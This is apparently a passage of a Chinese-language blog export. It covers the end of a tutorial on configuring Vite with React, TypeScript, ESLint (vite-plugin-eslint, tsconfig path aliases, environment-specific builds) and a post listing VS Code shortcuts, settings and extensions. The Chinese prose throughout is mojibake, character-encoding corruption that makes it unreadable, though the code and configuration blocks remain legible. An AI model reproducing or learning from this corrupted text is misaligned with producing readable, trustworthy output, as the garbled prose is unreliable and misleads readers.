çŸ¥é“å…¶å¯¦ä½ å¯ä»¥è‡ªå·±å»æ±ºå®š rulesï¼ŒESLint ä¸¦æ²’æœ‰ä¸€å®šè¦ä¾ç…§æŸå€‹ config çš„è¦å‰‡ï¼Œç•¢ç«Ÿæœ‰äº›è¦å‰‡å¯èƒ½ä¸é©ç”¨æ–¼ç›®å‰çš„å°ˆæ¡ˆï¼ˆä¾‹å¦‚æ²’æœ‰å®£å‘Š React çš„ä¾‹å­ï¼‰ã€‚ åˆ°ç›®å‰ç‚ºæ­¢ï¼Œå·²ç¶“è™•ç†å¥½ ESLint å’Œ prettier ç›¸é—œçš„è¨­å®šã€‚æ¥ä¸‹ä¾†æœƒæ˜¯ä¸€äº›å’Œ vite ç›¸é—œçš„é¡å¤–éœ€æ±‚ï¼Œå¦‚æœä½ å°é€™äº›æ²’æœ‰èˆˆè¶£çš„è©±åˆ°é€™é‚Šå°±å¯ä»¥çµæŸäº†ã€‚ 9. è®“ vite çµåˆ ESLint åŠŸèƒ½å¦‚æœä½ ä»¥å‰æ˜¯ç”¨ CRAï¼ˆCreate React Appï¼‰ ä¾†å»ºç«‹å°ˆæ¡ˆçš„è©±ï¼Œæ‡‰è©²æœƒå°é€™å€‹è¨äººå­çš„ç•«é¢å¾ˆç†Ÿæ‚‰ï¼š é€™é‚Šæƒ³åšçš„äº‹æƒ…æ˜¯è®“ vite å¯ä»¥çµåˆ ESLint çš„éŒ¯èª¤æç¤ºï¼Œè®“ ESLint ä¸€æ—¦å‡ºç¾ Error æ™‚å°±åœæ­¢ç·¨è­¯ï¼Œä¸¦ç”¢ç”Ÿè·Ÿ CRA ä¸€æ¨£çš„å…¨å±è­¦ç¤ºï¼š é™„è¨»ï¼šä¸€ç¨®ä¸ç…§è¦å‰‡ä¾†å°±è®“ä½ æ²’è¾¦æ³•é–‹ç™¼çš„æ¦‚å¿µ XD å¯¦ç¾çš„æ–¹å¼å¾ˆç°¡å–®ï¼Œé¦–å…ˆå®‰è£ vite-plugin-eslintï¼Œæ¥è‘—åˆ° vite.config.ts åŠ å…¥åº•ä¸‹å…§å®¹ï¼š 12345678import { defineConfig } from 'vite'import react from '@vitejs/plugin-react'import eslint from 'vite-plugin-eslint' // &lt;- new// https://vitejs.dev/config/export default defineConfig({ plugins: [react(), eslint()] // &lt;- new}) è¨­å®šå®Œä»¥å¾Œå¯ä»¥è‡ªå·±è©¦è‘—å¼„å‡ºä¸€å€‹ Error çœ‹çœ‹ï¼Œæ‡‰è©²å°±æœƒå‡ºç¾åŒæ¨£çš„è­¦ç¤ºè¨Šæ¯äº†ã€‚ 10. è¨­ç½® vite åœ¨ import æ™‚çš„ aliasåœ¨é–‹å§‹ä¹‹å‰å…ˆè§£é‡‹ä¸€å€‹é‡è¦è§€å¿µï¼š VS-Code æ˜¯ä¾æ“š tsconfig.json çš„è¨­å®šä¾†é¡¯ç¤º import è·¯å¾‘ Vite æ˜¯ä¾æ“š vite.config.ts çš„è¨­å®šä¾†ç·¨è­¯ import è·¯å¾‘ ä¹Ÿå°±æ˜¯èªªï¼Œå‡è¨­ä½ ç¾åœ¨æŠŠ tsconfig.json çš„ baseUrl è¨­ç‚º ./srcï¼Œé‚£ VS-Code å°±æœƒæ ¹æ“šé€™é …è¨­å®šä¾†é¡¯ç¤ºå°æ‡‰çš„è·¯å¾‘ï¼Œé€™æ˜¯æ­£å¸¸çš„è¡Œç‚ºæ²’éŒ¯ã€‚ ä½†æ¥è‘—é‡é»ä¾†äº†ï¼Œé›–ç„¶åœ¨ VS-Code ä¸Šçœ‹ä¼¼ä¸€åˆ‡å¾ˆå®Œç¾ï¼Œä½† vite å¯å°±ä¸æ˜¯é€™æ¨£äº†ï¼Œå› ç‚º vite ä¸¦ä¸æœƒæ ¹æ“š tsconfig.json çš„è¨­å®šä¸‹å»ç·¨è­¯ï¼Œæ‰€ä»¥ä½ æœ€å¾Œè·‘å‡ºä¾†çš„çµæœæœƒæ˜¯æœ‰å•é¡Œçš„ï¼š é™„è¨»ï¼šæ³¨æ„ VS-Code ç¢ºå¯¦æœ‰ä¾ç…§ tsconfig.json çš„è¨­å®šï¼Œæ‰€ä»¥åœ¨è¼¸å…¥ 'App' çš„æ™‚å€™æ‰æœƒå‡ºç¾å°æ‡‰çš„è‡ªå‹•è£œé½Šã€‚ æ‰€ä»¥é€™é‚Šè¦è™•ç†çš„å•é¡Œå°±æ˜¯ã€Œç¢ºä¿å…©é‚Šçš„è¨­å®šæ˜¯åŒæ­¥çš„ã€ã€‚å¦‚æœ tsconfig.json èªª baseUrl: './src'ï¼Œé‚£ vite.config.ts å°±ä¹Ÿè¦æœ‰ç›¸å°æ‡‰çš„è¨­å®šä¾†è™•ç†ç·¨è­¯æ™‚çš„è·¯å¾‘å•é¡Œã€‚ é€™é‚Šä½ å¯ä»¥ç”¨å®˜æ–¹æä¾›çš„ alias æ–¹å¼å»è™•ç†ï¼Œä¾‹å¦‚ï¼š 12345678910import * as path from 'path'export default defineConfig({ // ... resolve: { alias: { '@': path.resolve(__dirname, 'src') } }}) é€™æ¨£å­ vite åœ¨ç·¨è­¯æ™‚çœ‹åˆ° @ çš„æ™‚å€™å°±æœƒè‡ªå‹•ç•¶æˆæ˜¯ srcã€‚ ä½†æˆ‘è‡ªå·±æ›´æ¨è–¦ç”¨ vite-tsconfig-paths ä¾†è™•ç†ã€‚å®ƒæ˜¯ vite çš„ä¸€å€‹ pluginï¼Œèƒ½å¤ è®“ vite è‡ªå‹•æ ¹æ“š tsconfig.json çš„è¨­å®šä¸‹å»åšç·¨è­¯ï¼Œå°±ä¸ç”¨è‡ªå·±è™•ç†åŒæ­¥çš„å•é¡Œäº†ã€‚ å®‰è£å¥½å¾Œä¾ç…§æ–‡ä»¶è£¡çš„èªªæ˜æŠŠ vite-config-ts ä¿®æ”¹æˆåº•ä¸‹ï¼š 123456789import { defineConfig } from 'vite'import react from '@vitejs/plugin-react'import eslint from 'vite-plugin-eslint'import tsconfigPaths from 'vite-tsconfig-paths' // &lt;- new// https://vitejs.dev/config/export default defineConfig({ plugins: [react(), eslint(), tsconfigPaths()] // &lt;- new}) é€™æ¨£å­ vite çš„è·¯å¾‘å°±æœƒç›´æ¥åƒç…§ tsconfig.json çš„ config ä¸‹å»åšç·¨è­¯å›‰ã€‚ é‚„æ²’å®Œï¼Œé‚„æœ‰å¦å¤–ä¸€å€‹å•é¡Œå¦‚æœä½ æœ‰ç”¨åˆ° alias çš„åŠŸèƒ½çš„è©±ï¼Œæœƒç™¼ç¾é€™æ™‚å€™æ› ESLint å‡ºä¾†å“€åšäº†ï¼š 12345678910{ \"compilerOptions\": { \"target\": \"ESNext\", \"baseUrl\": \"./src\", \"paths\": { \"@/*\": [\"./*\"] // &lt;- alias } // ... }} ç•¶æ™‚å¯«åˆ°é€™è£¡æ™‚è…¦æµ·ä¸­çªç„¶æƒ³èµ· å¡ç±³ç‹— æ›¾ç¶“èªªéçš„ç¶“å…¸èªéŒ„ï¼š å·¥ç¨‹å¸«çš„æ—¥å¸¸å°±æ˜¯é™¤äº†ä¸€å€‹éŒ¯ä¹‹å¾Œçœ‹åˆ°çš„ä¸æ˜¯æ­£å¸¸ï¼Œè€Œæ˜¯çœ‹åˆ°ä¸‹ä¸€å€‹éŒ¯èª¤è¨Šæ¯ã€‚â€¦è¦æœ‰è€å¿ƒã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œé€™é‚Šè¦åšçš„äº‹æƒ…è·Ÿå‰›å‰›å·®ä¸å¤šã€‚å‰›å‰›æ˜¯å« vite å»è®€ tsconfig.json ä¾†åšç·¨è­¯ï¼Œç¾åœ¨è®Šæˆæ˜¯å« ESLint å»è®€ tsconfig.json ä¾†åš lintingï¼ˆå› ç‚º ESLint ä¸æœƒè‡ªå‹•å»è®€ tsconfig.jsonï¼‰ï¼Œæ‰€ä»¥è¦å®‰è£å¦ä¸€å€‹å¥—ä»¶æ˜¯ï¼šeslint-import-resolver-typescript å®‰è£å¥½å¾ŒæŠŠ .eslintrc.json ä¿®æ”¹æˆåº•ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536{ \"env\": { \"browser\": true, \"es2021\": true }, \"extends\": [ \"airbnb\", \"airbnb/hooks\", \"airbnb-typescript\", \"plugin:react/recommended\", \"plugin:@typescript-eslint/recommended\", \"plugin:prettier/recommended\" ], \"overrides\": [], \"parser\": \"@typescript-eslint/parser\", \"parserOptions\": { \"ecmaVersion\": \"latest\", \"sourceType\": \"module\", \"project\": \"tsconfig.json\" }, \"plugins\": [\"react\", \"@typescript-eslint\"], // åŠ ä¸Š settings é€™æ®µ \"settings\": { \"import/resolver\": { \"typescript\": { \"alwaysTryTypes\": true, \"project\": \"tsconfig.json\" } } }, \"rules\": { \"react/react-in-jsx-scope\": \"off\", \"@typescript-eslint/no-shadow\": \"off\", \"import/no-extraneous-dependencies\": [\"error\", { \"devDependencies\": true }] }} èª¿æ•´å®Œå¾Œæ‡‰è©²å°±èƒ½çœ‹åˆ°éŒ¯èª¤æ¶ˆå¤±å›‰ï¼š 11. åŠ ä¸Šç’°å¢ƒè®Šæ•¸æœ€å¾Œé€™ä¸€æ­¥æ˜¯æˆ‘è‡ªå·±å·¥ä½œä¸Šçš„éœ€æ±‚ï¼Œä½†æˆ‘æƒ³èªªä¸å®šæœ‰äººä¹Ÿæœ‰ç›¸åŒçš„éœ€æ±‚æ‰€ä»¥å°±é †ä¾¿å¯«ä¸‹ä¾†å§ã€‚ é€™é‚Šå°æ–¼ç’°å¢ƒè®Šæ•¸çš„å»ºç«‹ä¸æœƒè§£é‡‹å¤ªå¤šï¼Œæƒ³çŸ¥é“ç´°ç¯€çš„è©±å¯ä»¥åƒè€ƒ Vite Enviroment Variable æˆ– å®˜æ–¹æ–‡ä»¶ã€‚ é¦–å…ˆï¼Œé€™é‚Šæƒ³åˆ‡å‰²çš„ç’°å¢ƒåˆ†åˆ¥ç‚ºï¼š dev demo production æ‰€ä»¥æœƒå»ºç«‹ .env.devã€.env.demoã€.env.production é€™ä¸‰å€‹æª”æ¡ˆã€‚ æ¥è‘—æˆ‘å¸Œæœ›ç•¶æˆ‘åŸ·è¡Œä¸åŒçš„ build æŒ‡ä»¤æ™‚èƒ½å»è®€å–å°æ‡‰çš„ç’°å¢ƒè®Šæ•¸æª”æ¡ˆï¼Œæ‰€ä»¥ package.json æœƒä¿®æ”¹æˆé€™æ¨£ï¼š 1234567\"scripts\": { \"start\": \"vite\", \"build\": \"tsc &amp;&amp; vite build\", // &lt;- è®€å– .env.production \"demo\": \"tsc &amp;&amp; vite build --mode demo\", // &lt;- è®€å– .env.demo \"dev\": \"tsc &amp;&amp; vite build --mode dev\", // &lt;- è®€å– .env.dev \"preview\": \"vite preview\"} æ­¤å¤–ï¼Œæˆ‘ä¹Ÿå¸Œæœ›æœ€å¾Œ build å‡ºä¾†çš„æª”æ¡ˆå¯ä»¥æ”¾åœ¨ä¸åŒçš„è³‡æ–™å¤¾ä¸­ï¼Œæ‰€ä»¥æœƒæŠŠ vite-config.ts ä¿®æ”¹æˆé€™æ¨£ï¼š 1234567891011121314151617181920import { defineConfig } from 'vite'import react from '@vitejs/plugin-react'import eslint from 'vite-plugin-eslint'import tsconfigPaths from 'vite-tsconfig-paths'const pathMapping = { demo: './build-demo', dev: './build-dev', production: './build-production'} as { [key: string]: string }// è‡ªå‹•æ¥æ”¶åˆ°ä¸€å€‹ objï¼Œå…¶ä¸­ obj.mode æœƒå°æ‡‰åˆ° vite build --mode &lt;string&gt;export default ({ mode }: { mode: string }) =&gt; { return defineConfig({ plugins: [react(), eslint(), tsconfigPaths()], build: { outDir: pathMapping[mode] ?? './dist' } })} é€™é‚Šå¦‚æœåœ¨ build çš„æ™‚å€™å‡ºéŒ¯é€šå¸¸æ˜¯è·Ÿ typescript ç·¨è­¯æ™‚çš„å‹åˆ¥éŒ¯èª¤æœ‰é—œï¼Œå¯ä»¥çœ‹ä¸€ä¸‹éŒ¯èª¤è¨Šæ¯ä¸¦ä¸”ä¿®æ­£å³å¯ã€‚ å¦‚æœä½ å·²ç¶“è·Ÿè‘—æ¯ä¸€æ­¥åšåˆ°é€™é‚Šï¼Œæ­å–œä½ ï¼æ•´å€‹ start project å°±å·²ç¶“å»ºç«‹å®Œå›‰ã€‚ çµèªæ•´å€‹ ESLint è¨­å®šçš„æµç¨‹èªªè¤‡é›œä¸è¤‡é›œï¼Œèªªå®¹æ˜“ä¹Ÿä¸å®¹æ˜“ï¼Œç•¢ç«Ÿèµ°ä¸‹ä¾†æœƒç™¼ç¾å¸¸å¸¸ç¢°åˆ°è£äº† A ä»¥å¾Œ B å°±å‡ºå•é¡Œï¼Œåˆæˆ–è€…æ˜¯å› ç‚º TypeScript çš„é—œä¿‚è¦è™•ç†çš„ç›¸å®¹å•é¡Œè®Šçš„éº»ç…©è¨±å¤šï¼Œæ‰€ä»¥æˆ‘å…¶å¯¦ä¹ŸèŠ±äº†å¤§æ¦‚ä¸€å¤©çš„æ™‚é–“æ‰æŠŠæ•´å€‹å‰å¾Œé—œä¿‚çµ¦é‡æ¸…ã€‚ æœƒå¯«é€™ç¯‡çš„å¥‘æ©Ÿä¸»è¦é‚„æ˜¯å› ç‚ºç¶²è·¯ä¸Šçš„è³‡æºæ¯”è¼ƒé›¶æ•£ï¼Œä¹Ÿè¨±æ˜¯å› ç‚ºå¤§å®¶éƒ½æ˜¯å¾ç¶²è·¯ä¸Šäº’ç›¸åƒè€ƒçš„é—œä¿‚ï¼Œç¸½è¦ºå¾—æ¯”è¼ƒç†±é–€çš„å…§å®¹éƒ½é•·å¾—æœ‰é»é¡ä¼¼ï¼Œé€£æ²’è¬›æ¸…æ¥šçš„åœ°æ–¹ä¹Ÿå‰›å¥½å¾ˆå·§çš„æ²’æœ‰äººæåˆ°ï¼Œæ‰€ä»¥åªå¥½è‡ªå·±è©¦è‘—æŠŠé€™äº›é›¶æ•£çš„å…§å®¹çµ¦çµ„å†ä¸€èµ·ï¼Œè©¦è‘—è®“å®ƒå®Œæ•´æ›´æ¸…æ¥šä¸€äº›ã€‚ æˆ‘è¦ºå¾—å­¸ä¸€æ¨£æ±è¥¿æœ€é‡è¦çš„é‚„æ˜¯ç†è§£é‚£æ¨£çš„æ±è¥¿çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œåƒæˆ‘å¯«å®Œé€™ç¯‡ä»¥å¾Œå°±å° ESLint çš„æ•´å€‹æ¦‚å¿µå°±æ¸…æ¥šäº†è¨±å¤šï¼Œåœ¨èµ°æ¯ä¸€æ­¥çš„æ™‚å€™ä¹Ÿå¾ˆæ¸…æ¥šè‡ªå·±åœ¨åšä»€éº¼äº‹æƒ…ã€‚å¦‚æœä¸Šé¢çš„åœ°æ–¹æœ‰å“ªé‚Šè¦ºå¾—ä¸å¤ªæ‡‚çš„è©±ï¼Œæˆ‘æƒ³å¯èƒ½å°±æ˜¯ä½ å° ESlint çš„éƒ¨åˆ†æ²’æœ‰å¾ˆç†Ÿæ‰€ä»¥æ‰æœƒæœ‰é€™äº›ç–‘å•ï¼Œå»ºè­°å¯ä»¥åƒè€ƒæœ€ä¸‹é¢é™„çš„è³‡æºï¼Œæˆ‘è¦ºå¾—é€™äº›å°æˆ‘ç•¶åˆåœ¨å»ºæ§‹çš„æ™‚å€™å¸¶ä¾†äº†ä¸å°‘å¹«åŠ©ã€‚ æœ€å¾Œï¼Œå¦‚æœä½ çœŸçš„å¾ˆæ‡¶çš„è‡ªå·±èµ°é€™æ¯ä¸€æ­¥çš„è©±ï¼Œä»¥ä¸Šçš„å®Œæˆå“æˆ‘æœ‰æ”¾åœ¨ GitHub ä¸Šï¼Œå¯ä»¥åƒè€ƒåº•ä¸‹é€£çµï¼š åƒè€ƒè³‡æ–™ Setting up vite, React, TypeScript, eslint, vitest, testing-library and react-router ESLint + Prettier + VS Code â€” The Perfect Setup VSCode ESLint, Prettier &amp; Airbnb Style Guide Setup Absolute Imports and Module Path Aliases [note] å»ºç«‹å…¬å¸å…§éƒ¨ä½¿ç”¨çš„ eslint-config package [note] ESLint","link":"/2022/12/01/vite-start-project/"},{"title":"VS-Code ä¸€äº›å¯¦ç”¨çš„å¿«æ·éµ","text":"ä¸€æ¨£æ˜¯å¿«æ·éµç³»åˆ—ã€‚ Windows Ctrl + G è·³åˆ°æŸä¸€å€‹è¡Œæ•¸ Ctrl + E Ctrl + P åˆ‡æ›åˆ°æŸå€‹æª”æ¡ˆçš„åˆ†é  Ctrl + E + @[è®Šæ•¸åç¨± / Tag / å…§å®¹] åˆ‡æ›åˆ°æŸå€‹åˆ†é çš„æŸå€‹æ®µè½ Ctrl + L é¸å–æ•´è¡Œå…§å®¹ Ctrl + X Shift + Delete åˆªé™¤æ•´è¡Œå…§å®¹ Shift + æ–¹å‘éµ é¸å–æ–‡å­— Ctrl + æ–¹å‘éµ å–®å­—é–“è·³èºï¼ˆè‹¥è¦é¸å–çš„è©±å°±åŠ ä¸Š Shiftï¼‰ Homeéµ è·³åˆ°å¥å­é ­ç«¯ Endéµ è·³åˆ°å¥å­å°¾ç«¯ Ctrl + D é¸å–åŒåå­—ä¸² Ctrl + Shift + L é¸å–æ‰€æœ‰åŒåå­—ä¸² Alt + æ–¹å‘éµ ç§»å‹•ç¨‹å¼ç¢¼å€å¡Šï¼ˆå¯æ­é…é¸å–å…§å®¹ä½¿ç”¨ï¼‰ Alt + å·¦å³æ–¹å‘éµ åˆ‡æ›åˆ†é  Alt + Shift + ä¸Šæˆ–ä¸‹ è¤‡è£½ç¨‹å¼ç¢¼å€å¡Šï¼ˆå¯æ­é…é¸å–å…§å®¹ä½¿ç”¨ï¼‰ Alt + Shift + R æ‰“é–‹è³‡æ–™å¤¾ç¸½ç®¡ Alt + Z è‡ªå‹•æ›è¡Œé–‹é—œï¼ˆé—œæ‰å¾Œå°±ä¸æœƒéš¨è‘—å¯¬åº¦æ›è¡Œï¼‰ Ctrl + H æœå°‹å…§å®¹ + å–ä»£å…§å®¹ Ctrl + Shift + E åˆ‡æ›åˆ°æª”æ¡ˆé¢æ¿ï¼ˆå´é‚Šæ¬„ï¼‰ Ctrl + Shift + F åˆ‡æ›åˆ°æœå°‹é¢æ¿ï¼ˆå´é‚Šæ¬„ï¼‰ Ctrl + N æ–°å¢æª”æ¡ˆ Ctrl + Kï¼ŒM é¸æ“‡æª”æ¡ˆçš„ç¨‹å¼èªè¨€ Ctrl + Shift + O æœå°‹è®Šæ•¸ã€å‡½å¼ F2 ä¿®æ”¹è®Šæ•¸æˆ–å‡½å¼çš„åç¨±ï¼ˆä¸æœƒæ”¹åˆ°å­—ä¸²ï¼‰ï¼ˆè¨˜å¾—å…ˆé¸å–ï¼‰ F12 æŸ¥çœ‹æŸæ®µå‡½å¼çš„å…§å®¹ Ctrl + ~ Ctrl + J æ‰“é–‹æˆ–é—œé–‰çµ‚ç«¯æ©Ÿ Ctrl + / è¨»è§£ Alt + Shift + A å¤šè¡Œè¨»è§£ Ctrl + B æ‰“é–‹æˆ–é—œé–‰å´é‚Šæ”” Shift + Alt + F å°å…§å®¹æ’ç‰ˆ Ctrl + Shift + M æŸ¥çœ‹æœ‰ Bug çš„åˆ†é  Ctrl + \\ åˆ‡å‰²è¦–çª— Ctrl + ï¼Œ Ctrl + ã€‚ å¿«é€Ÿæ¨™é»ç¬¦è™Ÿ Ctrl + K + L æ‘ºç–Šæˆ–å±•é–‹ä¸€å€‹å€å¡Šçš„å…§å®¹ Ctrl + Kï¼ŒW é—œé–‰æ‰€æœ‰åˆ†é  Ctrl + K + U é—œé–‰æ‰€æœ‰ã€Œå·²å„²å­˜ã€çš„åˆ†é  Ctrl + Shift + T å¾©åŸåˆ†é ï¼ˆåªå›å¾©æœ€å¾Œä¸€å€‹é—œæ‰çš„åˆ†é ï¼‰ Ctrl + M æŠŠ tab éµè®Šæˆ focus åŠŸèƒ½ï¼ˆå°±æ˜¯ tab çš„é è¨­åŠŸèƒ½ï¼‰ Ctrl + K + S å­˜æª”æ‰€æœ‰åˆ†é  Mac Command + Option + up/down å¤šå€‹æ¸¸æ¨™ Option + up/down ç§»å‹•ç¨‹å¼ç¢¼ Command + P åˆ‡æ›åˆ†é  Command/Fn + left/right Home éµå’Œ End éµçš„åŠŸèƒ½ Command + top/bottom è·³åˆ°æª”æ¡ˆçš„èµ·å§‹ä½ç½®/çµ‚é»ä½ç½®ï¼ˆå¯æ­é… shift é¸å–ï¼‰ Command + Shift + L é¸å–æ‰€æœ‰ç›¸åŒçš„æ–‡å­— Command + L é¸å–æ•´è¡Œ Command + Shift + left/right ç­‰æ–¼ Ctrl + L çš„æ•ˆæœ Option + esc æˆ– command + i å¯ä»¥è‡ªå‹•é¡¯ç¤ºç›¸é—œçš„ value æˆ– props Command + K + V æ‰“é–‹ markdown preview è¦–çª— Option + Command + S å­˜æ“‹æ‰€æœ‰åˆ†é  Shift + Command + . æ‰“é–‹ breadcrumbï¼Œä¸¦ä¸”ç”¨ â† å’Œ â†’ ä¾†ç§»å‹•ä½ç½® Option + Command + click æŠŠ definition åˆ†å‰²åˆ°æ–°åˆ†é  Command + Shift + O æœå°‹å‡½å¼ or è®Šæ•¸çš„ popup Shift + F12 æ‰“é–‹æŸå€‹è®Šæ•¸æˆ–å‡½å¼çš„æ‰€æœ‰ reference popup F12 è·³åˆ° reference æˆ– definition çš„ä½ç½® F8 è·³åˆ° Linter çš„éŒ¯èª¤ä½ç½® Command + Shift + M æ‰“é–‹ Linter éŒ¯èª¤åˆ—è¡¨ Ctrl + g è·³åˆ°æŒ‡å®šè¡Œæ•¸ Command + j toggle panel æ”¶åˆï¼ˆterminalï¼‰ Command + \\ åˆ†å‰²è¦–çª—ï¼ˆå‚ç›´ï¼‰ Command + 1 or 2 or 3... åˆ‡æ›åˆ°ä¸åŒçš„åˆ†å‰²è¦–çª— Command + K, Command + \\ åˆ†å‰²è¦–çª—ï¼ˆæ°´å¹³ï¼‰ Command + Option + â† / â†’ åˆ‡æ› Tab é é¢ï¼ˆä¹Ÿå¯ä»¥æŠŠæ¸¸æ¨™åˆ‡æ›åˆ°åˆ†å‰²è¦–çª—ï¼‰ Command + Option + [ / ] æ”¶èµ· / å±•é–‹ç¨‹å¼ç¢¼å€å¡Š Command + Shift + \\ è·³åˆ°èµ·å§‹ bracket æˆ–çµå°¾ bracketï¼ˆè·Ÿ vim çš„ % ä¸€æ¨£åŠŸèƒ½ï¼‰ Command + Shift + E æŠŠæ¸¸æ¨™ç§»åˆ° Side bar æˆ– Editor Command + Shift + F æ‰“é–‹æœå°‹å´é‚Šæ¬„ Space æ‰“é–‹åœ¨ Sidebar ä¸­é¸å–çš„æª”æ¡ˆ Option / Control + Enter ä»¥åˆ†å‰²è¦–çª—é–‹å•Ÿåˆ†é  Command K + Command I å½ˆå‡º Symbol çš„å‹åˆ¥å…§å®¹ï¼ˆæ»‘é¼  hover æœƒå½ˆå‡ºä¾†çš„é‚£å€‹ï¼‰ Option + F5 è·³åˆ°ä¸‹ä¸€å€‹æ›´æ–°çš„ä½ç½®ï¼ˆGitï¼‰ Command + K + I è§¸ç™¼ hover æ•ˆæœ é€™é‚Šçš„è©³ç´°è³‡è¨Šå¯ä»¥åƒè€ƒ VS-Code çš„ å®˜æ–¹æ–‡ä»¶ ä»‹ç´¹ã€‚ Emmet çš„è¨­å®šå¦‚æœæƒ³åœ¨ JS çš„ template string ä¸­ä½¿ç”¨ Emmetï¼Œå¯ä»¥åŠ ä¸Šé€™æ®µè¨­å®šï¼š 12345// è¦åŒ…å«çš„èªè¨€ï¼ˆé è¨­æ‡‰è©²æ˜¯åªæœ‰ HTMLå§ï¼‰\"emmet.includeLanguages\": { \"javascript\": \"javascriptreact\",},\"emmet.triggerExpansionOnTab\": true, ç”¨ CLI æ‰“é–‹ VS-Code çš„æ–¹å¼é¦–å…ˆå…ˆç”¨ VS-Code æ·»åŠ ç’°å¢ƒè®Šæ•¸ Command + Shift + P æœå°‹ shellï¼Œç„¶å¾Œ Enter çœ‹åˆ° OK å°±å¥½äº†ã€‚ æ‰“é–‹æ•´å€‹è³‡æ–™å¤¾ï¼š 1code . æ‰“é–‹æŒ‡å®šæª”æ¡ˆï¼š 1code file.js åªæ‰“é–‹ VS-Codeï¼š 1code -- æ›´æ”¹å·¦å´è³‡æ–™å¤¾çš„é¡¯ç¤ºæ–¹å¼åŸæœ¬æ˜¯é•·é€™æ¨£ï¼š ä½†ä½ å¯èƒ½æœƒå¸Œæœ›æ˜¯é€™æ¨£ï¼š é€™æ™‚å€™åªè¦æ–°å¢ä¸€é …è¨­å®šå°±å¥½ï¼š 12// é è¨­æ˜¯ true\"explorer.compactFolders\": false, æå®šï¼ é¡¯ç¤ºæç¤ºå…§å®¹åœ¨ä½¿ç”¨ trigger suggestion çš„æ™‚å€™ä½ å¯èƒ½æœƒæƒ³çœ‹ä»–çš„ detailï¼Œåƒé€™æ¨£ï¼š ä¸éå› ç‚ºé è¨­çš„å¿«æ·éµè·Ÿ Mac æœ‰è¡çªï¼Œæ‰€ä»¥å»ºè­°èƒ½æŠŠ toggleSuggestionDetails èª¿æ•´ä¸€ä¸‹ï¼š å¹« function åŠ ä¸Šèªªæ˜åªè¦è¼¸å…¥ /** å°±æœƒè‡ªå‹•ç”¢ç”Ÿåƒé€™æ¨£çš„ snippe 12345678910/** * åŠ å…¥è³¼ç‰©è»Šçš„å‡½å¼ï¼Œè®šå§ï¼ * @param {Number} num ç”¢å“çš„ id * */function addToCart(num) { console.log(`add item ${num} to cart.`)}module.exports = addToCart å¯ä»¥åŠ å…¥èªªæ˜æ–‡å­—ï¼Œè€Œ {Number} çš„éƒ¨åˆ†ä»£è¡¨åƒæ•¸ num çš„è³‡æ–™å‹æ…‹ã€‚ æ¥è‘—åœ¨ä½¿ç”¨é€™å€‹ function çš„åœ°æ–¹å°±æœƒå‡ºç¾å°æ‡‰æç¤ºï¼š æˆ‘çš„ VS-Code è¨­å®šæª”1234567891011121314151617181920212223242526{ \"workbench.panel.defaultLocation\": \"right\", \"editor.cursorSmoothCaretAnimation\": \"on\", \"explorer.compactFolders\": false, \"workbench.iconTheme\": \"material-icon-theme\", \"terminal.integrated.fontSize\": 14, \"editor.fontFamily\": \"'JetBrainsMono Nerd Font', Monaco, 'Courier New', monospace\", \"editor.tabSize\": 2, \"editor.fontSize\": 14, \"editor.fontLigatures\": true, \"editor.formatOnSave\": true, \"editor.defaultFormatter\": \"esbenp.prettier-vscode\", \"editor.suggest.showStatusBar\": true, \"prettier.jsxSingleQuote\": true, \"prettier.printWidth\": 120, \"prettier.singleAttributePerLine\": true, \"prettier.semi\": false, \"prettier.singleQuote\": true, \"prettier.trailingComma\": \"none\", \"emmet.includeLanguages\": { \"javascript\": \"javascriptreact\" }, \"formattingToggle.affects\": [\"editor.formatOnSave\"], \"explorer.fileNesting.enabled\": false, \"editor.minimap.enabled\": false} æœ‰ä¿®æ”¹çš„å¿«æ·éµ Go forwardï¼šCommand + ] Go backï¼šCommand + [ Indent line ç§»é™¤ Outdent line ç§»é™¤ æ¨è–¦è£çš„å¥—ä»¶ Material Icon Theme ç¾ç¾çš„ Icon One Dark Pro é…è‰²ä¸»é¡Œä¸€ Tokyo Night é…è‰²ä¸»é¡ŒäºŒ Dracula Official é…è‰²ä¸»é¡Œä¸‰ expand-region é¸å–å·¥å…· indent-rainbow ç¸®æ’é†’ç›®è‰²å½© Code Spell Checker éŒ¯å­—æª¢æŸ¥ Hex è½‰ RGBA è‰²å½©è½‰æ› ESLint å°±æ˜¯æª¢æŸ¥ JS çš„ Linter Power Mode ç‚«æ³¡çš„ typing æ•ˆæœ :emojisense: å¿«é€Ÿæ’å…¥ emoji GitLens åœ˜éšŠåˆä½œæ™‚å¾ˆå¥½ç”¨ RapidAPI Client ä¸æƒ³ç”¨ PostMan çš„å¦ä¸€ç¨®é¸æ“‡ Tailwind CSS IntelliSense å¯« Tailwind çš„å¥½å¹«æ‰‹ï¼ env-cmd-file-syntax æ”¯æ´ env æª”æ¡ˆ ES7+ React/Redux/React-Native snippets React Snippets Live Server Live Server ä¸è§£é‡‹ MDX MDX èªæ³• TypeScript Vue Plugin (Volar) çµ¦ Volar ç”¨çš„ TypeScript å¥—ä»¶ Vue Language Features (Volar) Vue èªæ³•æ”¯æ´ Clipboard Manager è¤‡è£½è²¼ä¸Šå¥½å¹«æ‰‹ change-case æŠŠå–®å­—è½‰æ›æˆå„ç¨® case CodeSnap åŠ äº†ç¾åœ–ç§€ç§€çš„ç¨‹å¼ç¢¼ï¼ˆæ‹ç«‹å¾—ï¼‰ Center Editor Window è¦–è§’ç½®ä¸­ï¼ˆæœ‰ç”¨é vim çš„ zz éƒ½æ‡‚ï¼‰ jumpy å¿«é€ŸæŠŠæ¸¸æ¨™è·³åˆ°æƒ³è¦çš„ä½ç½®ã€‚ Inline Parameters for VSCode é¡¯ç¤º parameter çš„åç¨±ï¼ˆé¡ä¼¼ IntelliJï¼‰ Formatting Toggle ä¸€éµåˆ‡æ› Formatter pretty-ts-errors çµ¦äººé¡çœ‹çš„ TS éŒ¯èª¤è¨Šæ¯ markdown-all-in-one æœ‰åœ¨ç”¨ markdown çš„äººä¸è¦éŒ¯éï¼ TODO-Highlight å°±æ˜¯ TODO è²¼ç´™ åƒè€ƒè³‡æ–™ æ¯›æ¯›å‰ç«¯ç­†è¨˜ 20 å€‹ VSCode é–‹ç™¼å°æŠ€å·§ï¼Œè®“ä½  Coding ä¸‰å€é€Ÿï¼ Visual Studio Code 